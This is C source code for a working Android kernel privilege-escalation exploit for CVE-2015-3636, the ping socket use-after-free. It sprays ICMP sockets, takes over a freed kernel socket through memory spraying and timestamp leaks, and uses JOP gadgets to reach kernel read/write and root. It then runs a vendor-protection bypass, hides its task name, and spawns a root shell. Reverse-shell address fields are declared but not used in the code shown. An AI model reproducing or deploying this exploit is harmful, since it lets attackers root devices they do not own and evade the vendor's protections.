/*
 * CVE-2015-3636 exploit adp args
 *
 * Copyright (C) 2018 by idhyt3r@gmail.com
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/time.h>
#include <sys/prctl.h>
#include <sched.h>
#include <sys/ioctl.h>


/* ------------------ return ------------------- */
#define FAILED -1
#define SUCCESSED 0

#define MAX_CHILDREN_PROCESS    1024
#define MAX_CHILDREN_SOCKETS    65000
#define MAX_MMAPS               1024

#define MMAP_BASE(x)    (((unsigned)(x)) & ~(MMAP_SIZE - 1))
#define MMAP_SIZE               (2 * 1024 * 1024)

#define DEFAULT_RESERVE_SIZE    (32 * 1024 * 1024)

#define TIMESTAMP_MAGIC         0x0db4da5f

#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))

#define OFFSET_SK_PROT          0x24
#define OFFSET_SK_STAMP         0x148
#define OFFSET_MC_LIST          0x1c4

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS            0x8907
#endif /* SIOCGSTAMPNS */

#define OOM_DISABLE             (-17)

#define NSEC_PER_SEC            1000000000

#define LIST_POISON2            0x00200200

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))

//#define TEST_ADDR 0xc1414141
//#define TEST_ADDR 0xc03b42d4

#define PORT 10086

char *jop_buf = (char *)0x0c100000;

struct child_status_t {
  int num_sockets;
  int result;
};

/****************************************************************/
/*                    root define begin                         */
/****************************************************************/

/* include */
#include "rootz.h"
#include "log.h"
#include "dict.h"
#include "silly.h"

/* adp args */
static int adp_sn;
static unsigned long adp_init_task;
static unsigned long adp_task_security_offset;
static unsigned long adp_task_cred_uid_offset;

static unsigned long adp_ptmx_fops;
static unsigned long adp_ptmx_ioctl_offset;

// used to control kernel_sock_ioctl regs
static unsigned long adp_before_kernel_sock_ioctl;

/* run script path */
static char adp_script_path[0xff] = { 0 };

/* reverse shell ip&port */
static char adp_rshell_ip[0x40] = { 0 };
static char adp_rshell_port[0x10] = { 0 };

/*
  初始化适配参数
*/

extern dict_t *transl_param_dict;

static int get_adp_ulval(char *name, unsigned long *value) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  *value = strtoul(var, NULL, 16);
  log_dump(LOG_DEBUG, "%s = 0x%lx\n", name, *value);
  return 1;
}

static int get_adp_str(char *name, char *value, int len) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  strncpy(value, var, len);
  log_dump(LOG_DEBUG, "%s = %s, %d\n", name, value, strlen(value));
  return 1;
}

static int rootz_before(int argc, char *argv[]) {
  // 设置日志路径, 不设置打印到控制台
  // set_logfile_path("/data/local/tmp/8890.log");
  // 适配参数初始化
  if (parse_args(argc, argv) < 0) {
    log_dump(LOG_ERR, "[-] parse_args failed\n");
    return -1;
  }

  char *var;

  // 0 failed

  /* root before */
  if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get n_sn failed\n");
    return -1;
  }
  adp_sn = atoi(var);
  log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);

  if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
  if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
  if(!get_adp_ulval(k_task_cred_uid_offset, &adp_task_cred_uid_offset)) return -1;
  if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
  if(!get_adp_ulval(k_ptmx_ioctl_offset, &adp_ptmx_ioctl_offset)) return -1;
  if(!get_adp_ulval(k_before_kernel_sock_ioctl, &adp_before_kernel_sock_ioctl)) return -1;

#if 1
  printf(" adp_init_task = 0x%lx\n", adp_init_task);
  printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
  printf(" adp_task_cred_uid_offset = 0x%lx\n", adp_task_cred_uid_offset);
  printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
  printf(" adp_ptmx_ioctl_offset = 0x%lx\n", adp_ptmx_ioctl_offset);
  printf(" adp_before_kernel_sock_ioctl = 0x%lx\n", adp_before_kernel_sock_ioctl);

#endif

  return 0;
}

/*
  提权过后的操作
*/
static int rootz_after() {

  if(transl_param_dict) {
    vendor_protect_bypass(transl_param_dict);
    silly_everything_after_root(transl_param_dict);
  }

  if(transl_param_dict) {
    dict_destory(transl_param_dict);
    free(transl_param_dict);
  }

  return 0;
}

/****************************************************************/
/*                    root define end                           */
/****************************************************************/

/****************************************************************/
/*                     trigger  begin                           */
/****************************************************************/
static void map_jop_buf() {

  jop_buf =  mmap(jop_buf, 4096,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0);

  if (jop_buf == MAP_FAILED) {
    log_dump(LOG_DEBUG, "[-] map jop_buf failed!\n");
  }
}

static size_t get_page_size(void) {

  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE);
  }

  return pagesize;
}

static int lock_page_in_memory(void *address, size_t size) {

  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static void populate_pagetable_for_address(void *address) {

  *(void **)address = NULL;
}

static void *protect_crash_when_double_free(void) {

  void *address;
  size_t pagesize;

  pagesize = get_page_size();

  address = (void *)((LIST_POISON2 / pagesize) * pagesize);

  address =  mmap(address, pagesize,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0);

  if (address == MAP_FAILED) {
    return NULL;
  }

  populate_pagetable_for_address(address);
  lock_page_in_memory(address, pagesize);

  return address;
}

static int maximize_fd_limit(void) {

  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim);

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur;
}

static int close_all_fds_except_pipe(int pipe_write, int num_fds) {
  int i;
  int result;

  result = 0;

  for (i = 0; i < num_fds; i++) {
    int ret;

    if (i == pipe_write) {
      continue;
    }

    ret = close(i);
    if (ret != 0) {
      result = -1;
    }
  }

  return result;
}

static int create_icmp_socket(void) {

  struct sockaddr_in sa;
  int sock;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_INET;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
  if (sock == -1) {
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    int result;

    result = errno;
    close(sock);
    errno = result;

    return -1;
  }

  return sock;
}

static int send_status_to_parent(int pipe_write, int num_sockets, int result) {

  struct child_status_t status;

  memset(&status, 0, sizeof status);

  status.num_sockets = num_sockets;
  status.result = result;

  write(pipe_write, &status, sizeof status);

  return 0;
}

static int wait_to_close(int pipe_write) {

  close(pipe_write);

  while (1) {
    sleep(60);
  }
}

static int close_icmp_socket(int sock) {

  return close(sock);
}

static int do_child_task(int pipe_write, int num_fds) {

  int socks[num_fds];
  int result;
  int ret;
  int i;

  result = 0;

  close_all_fds_except_pipe(pipe_write, num_fds);

  for (i = 0; i < num_fds; i++) {
    socks[i] = create_icmp_socket();
    if (socks[i] == -1) {
      result = errno;
      break;
    }
  }

  num_fds = i;

  send_status_to_parent(pipe_write, num_fds, result);
  wait_to_close(pipe_write);

  for (i = 0; i < num_fds; i++) {
    ret = close_icmp_socket(socks[i]);
  }

  if (ret == -1) {
    return -1;
  }

  return 0;
}

static int wait_for_sockets_created(int pipe_read, int *num_socks_created) {

  struct child_status_t status;
  int i;
  int ret;

  *num_socks_created = 0;

  ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK);
  if (ret == -1) {
    perror("fcntl()");
    return -1;
  }

  for (i = 0; i < 50; i++) {
    ret = read(pipe_read, &status, sizeof status);
    if (ret == -1 && errno == EAGAIN) {
      usleep(100000);
      continue;
    }

    break;
  }

  if (ret == -1 && errno == EAGAIN) {
    log_dump(LOG_DEBUG, "[-] read(): Timeout\n");
    return -1;
  }

  if (ret == -1) {
    perror("read()");
    return -1;
  }

  if (ret != sizeof (status)) {
    log_dump(LOG_DEBUG, "[-] read(): Unexpected EOF\n");
    return -1;
  }

  *num_socks_created = status.num_sockets;

  return status.result;
}

static int create_child(int *pipe_read, int num_fds, pid_t *pid, int *num_socks_created) {

  int pipe_fds[2];
  int ret;

  *pid = -1;
  *num_socks_created = 0;

  ret = pipe(pipe_fds);
  if (ret != 0) {
    perror("pipe()");
    return -1;
  }

  *pid = fork();
  if (*pid == -1) {
    perror("fork()");
    return -1;
  }

  if (*pid == 0) {
    close(pipe_fds[0]);

    do_child_task(pipe_fds[1], num_fds);
    exit(0);
  }

  close(pipe_fds[1]);
  *pipe_read = pipe_fds[0];

  ret = wait_for_sockets_created(*pipe_read, num_socks_created);
  if (ret == EMFILE) {
    ret = 0;
  }

  if (ret != 0) {
    kill(*pid,  SIGKILL);
  }

  return ret;
}

static int close_child_sockets(int pipe_read, pid_t pid) {

  int timeout;
  int status;
  int success;
  int ret;

  success = 0;

  close(pipe_read);
  kill(pid,  SIGTERM);

  for (timeout = 50; timeout > 0; timeout--) {
    ret = waitpid(pid, &status, WNOHANG);
    if (ret != 0) {
      break;
    }

    if (WIFEXITED(status)) {
      success = 1;
      break;
    }

    usleep(100000);
  }

  kill(pid,  SIGKILL);

  ret = waitpid(pid, &status, 0);
  if (ret != 0) {
    return -1;
  }

  if (WIFEXITED(status)) {
    success = 1;
  }

  if (success) {
    return 0;
  }

  return -1;
}

static int setup_vul_socket(int sock) {

  struct sockaddr_in sa;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_UNSPEC;

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    log_dump(LOG_DEBUG, "[-] connect(%d) #1: ret = %d\n", sock, ret);
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    log_dump(LOG_DEBUG, "[-] connect%d() #2: ret = %d\n", sock, ret);
    return -1;
  }

  return 0;
}

int *create_vul_sockets(void) {

  static pid_t pids[MAX_CHILDREN_PROCESS];
  static int pipe_reads[MAX_CHILDREN_PROCESS];
  int max_fds;
  int *socks;
  int num_socks;
  int num_children_process;
  int num_children_socks;
  int ret;
  int i;

  log_dump(LOG_ERR, "[+] Creating target socket...");
  fflush(stdout);

  max_fds = maximize_fd_limit();

  socks = malloc((max_fds + 1) * sizeof (*socks));
  if (!socks) {
    log_dump(LOG_ERR, "[-] No memory\n");
    return NULL;
  }

  num_children_process = 0;
  num_socks = 0;
  num_children_socks = 0;
  ret = 0;

  for (i = 0; i < MAX_CHILDREN_PROCESS; i++) {
    int max_children_socks;
    int num_socks_created;

    max_children_socks = max_fds;
    if (max_children_socks + num_children_socks > MAX_CHILDREN_SOCKETS) {
      max_children_socks = MAX_CHILDREN_SOCKETS - num_children_socks;
      if (max_children_socks < 1) {
        break;
      }
    }

    ret = create_child(&pipe_reads[i], max_children_socks, &pids[i], &num_socks_created);
    if (pids[i] == -1) {
      break;
    }

    num_children_process++;
    num_children_socks += num_socks_created;

    log_dump(LOG_ERR, ".");
    fflush(stdout);

    if (num_socks < max_fds) {
      socks[num_socks] = create_icmp_socket();
      if (socks[num_socks] == -1) {
        break;
      }

      num_socks++;
    }

    if (ret != 0) {
      break;
    }
  }

  log_dump(LOG_ERR, "\n[+] OK\n");
  log_dump(LOG_ERR, "[+] %d + %d sockets created\n", num_socks, num_children_socks);

  for (i = 0; i < num_children_process; i++) {
    close_child_sockets(pipe_reads[i], pids[i]);
  }

  if (num_socks < 1) {
    log_dump(LOG_ERR, "[+] No icmp socket available\n");
    free(socks);
    return NULL;
  }

  socks[num_socks] = -1;

  for (i = 0; i < num_socks; i++) {
    ret = setup_vul_socket(socks[i]);
  }

  return socks;
}

static void fill_with_payload(void *address, size_t size) {

  unsigned *p = address;
  int i;

  for (i = 0; i < size; i += sizeof (*p) * 2) {
    *p++ = (unsigned)p;
    *p++ = TIMESTAMP_MAGIC;
  }
}

static int get_sk_from_timestamp(int sock, unsigned long *paddr) {

  struct timespec tv;
  uint64_t value;
  uint32_t high, low;
  int ret;

  ret = ioctl(sock, SIOCGSTAMPNS, &tv);
  if (ret != 0) {
    return -1;
  }

  value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;



  high = (unsigned)(value >> 32);
  low = (unsigned)value;


  if (high == TIMESTAMP_MAGIC) {
    if (paddr)
      *paddr = low - OFFSET_SK_STAMP;
    return 1;
  }

  return 0;
}

static int try_control_sk(int *socks) {

  static int reserve_size = DEFAULT_RESERVE_SIZE;
  static int loop_count = 0;
  static void *address[MAX_MMAPS];
  struct sysinfo info;
  int success;
  int count;
  int i;
  int ret;

  success = 0;

  loop_count++;

  for (i = 0; i < MAX_MMAPS; i++) {
    int j;

    ret = sysinfo(&info);
    if (ret == 0) {
      if (info.freeram < reserve_size) {
        if (loop_count < 4) {
          reserve_size = info.freeram;
        }

        break;
      }
    }

    address[i] =  mmap(NULL, MMAP_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (address[i] == MAP_FAILED) {
      log_dump(LOG_DEBUG, "[-] mmap(): failed: %s (%d)\n", strerror(errno), errno);
      break;
    }

    lock_page_in_memory(address[i], MMAP_SIZE);
    fill_with_payload(address[i], MMAP_SIZE);

    for (j = 0; socks[j] != -1; j++) {
      ret = get_sk_from_timestamp(socks[j], NULL);
      if (ret > 0) {
        success = 1;
        address[i] = 0;
      }
    }

    if (success) {
      break;
    }
  }

  count = i;
  log_dump(LOG_DEBUG, "[+] %d bytes allocated\n", count * MMAP_SIZE);

  for (i = 0; i < count; i++) {
    if (address[i]) {
      munmap(address[i], MMAP_SIZE);
    }
  }

  if (success) {
    return 0;
  }

  return -1;
}

int trigger(int *socks) {

  void *protect = NULL;
  int ret = 1;

  log_dump(LOG_DEBUG, "[+] begin to trigger EXP.\n");

  map_jop_buf();

  protect = protect_crash_when_double_free();
  if (!protect) {
    log_dump(LOG_DEBUG, "[-] Error in protect_crash_when_double_free()\n");
    return 1;
  }

  socks = create_vul_sockets();
  if (socks == NULL) {
    return 1;
  }

  while (1) {
    ret = try_control_sk(socks);
    if (ret == 0) {
      log_dump(LOG_DEBUG, "[+] Done!\n");
      break;
    }
  }

  return socks;
}
/****************************************************************/
/*                       trigger  end                           */
/****************************************************************/



/****************************************************************/
/*                    obtain_root   begin                       */
/****************************************************************/

static int setup_get_root(void *sk) {

  static unsigned prot[256];
  unsigned *mmap_end_address;
  unsigned *p;
  int i;

  for (i = 0; i < ARRAY_SIZE(prot); i++) {
    prot[i] = (unsigned)adp_before_kernel_sock_ioctl;
  }


  mmap_end_address = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;


  for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = 0;
  }
#if 1
  for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = (unsigned)prot;
  }
#endif
  return 0;
}

static int ioctl_icmp_socket(int sock) {

  int ret = 0;
  int i = 0;

#if 0
  *((unsigned long *)(jop_buf + 0xf8)) = (unsigned long )jop_buf;
  *((unsigned long *)(jop_buf + 0xc)) = (unsigned long )0xc06958b0;
  *((unsigned long *)(jop_buf + 0x18)) = (unsigned long )jop_buf;
  *((unsigned long *)(jop_buf + 0x24)) = (unsigned long )0xc06958dc;
#endif

  if (adp_sn == 141) {
    for (i = 0; i < 0x10; ++i) {

      if (j_jop1[i].index == 0 && j_jop1[i].addr == 0)
        break;
      else
        *((unsigned long *)(j_jop1[i].index)) = j_jop1[i].addr;
    }
  } 
  else {
    log_dump(LOG_ERR, "[-] not found j_jop2 adpter!\n");
    exit(-1);
  }

  ret = ioctl(sock, 0x0c100000, (void *)jop_buf);

  return 0;
}

static void do_get_root(int *socks) {

  int success;
  int has_invalid_sk;
  int ret;
  int i;

  success = 0;
  has_invalid_sk = 0;

  for (i = 0; socks[i] != -1; i++) {
    void *sk;
    log_dump(LOG_DEBUG, "[+] do_get_root\n");
    ret = get_sk_from_timestamp(socks[i], (unsigned long *)&sk);
    if (ret <= 0) {
      has_invalid_sk = 1;
      continue;
    }

    setup_get_root(sk);

    ioctl_icmp_socket(socks[i]);

    if (getuid() == 0) {
      success = 1;
    }
  }

  unsigned long rw_cap;
  //static unsigned long adp_ptmx_fops = 0xc0fffaa0;

#if 1
  if (pipe_read_memory((void*)adp_ptmx_fops, (void*)&rw_cap, sizeof(rw_cap)) == sizeof(rw_cap)) {
      log_dump(LOG_DEBUG, "[+] cat arbitrary read/write succeeded 0x%lx = 0x%lx\n", adp_ptmx_fops, rw_cap);
  }
#endif

  log_dump(LOG_DEBUG, "[?] root run here!\n");

  char random_name[0x10] = { 0 };
  set_random_task_name(4, random_name);

  log_dump(LOG_DEBUG, "[?] obtain_root_by_task_name!\n");
  obtain_root_by_task_name(adp_init_task, random_name, adp_task_security_offset, adp_task_cred_uid_offset);

}


static int obtain_root(int *socks) {

  do_get_root(socks);

}
/****************************************************************/
/*                    obtain_root   end                         */
/****************************************************************/


int main(int argc, char *const argv[]) {

  int *socks;
  int ret;

  if(rootz_before(argc, argv)) {
    log_dump(LOG_ERR, "[-] rootz_before failed!\n");
    return FAILED;
  }

  if(adp_sn != 141) {
    log_dump(LOG_ERR, "[-] adp sn error!\n");
    return FAILED;
  }

  if ((socks = trigger(socks)) == FAILED) {
    return FAILED;
  }

  log_dump(LOG_DEBUG, "[+] main %p socks\n", socks);

  log_dump(LOG_NORMAL, "\t[*] start, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  obtain_root(socks);

  log_dump(LOG_NORMAL, "\t[*] end, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  if(rootz_after()) {
    log_dump(LOG_ERR, "[-] rootz_after failed!\n");
  }

  system("USER=ROOT /system/bin/sh");

  fprintf(stderr, "end...\n");

  while(1);

  return 0;
}